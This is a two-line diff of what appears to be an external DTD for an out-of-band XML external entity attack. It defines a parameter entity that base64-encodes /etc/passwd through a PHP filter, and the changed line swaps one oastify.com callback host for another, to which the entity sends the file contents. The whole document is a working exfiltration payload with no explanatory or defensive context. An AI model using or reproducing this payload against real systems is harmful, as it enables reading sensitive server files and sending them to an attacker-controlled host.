@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://a8j0o4js632yffehcck7yao31u7lvbj0.oastify.com/?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://tyvjen9bwmsh5y402vaqotemrdx4lw9l.oastify.com/?%data;'>">
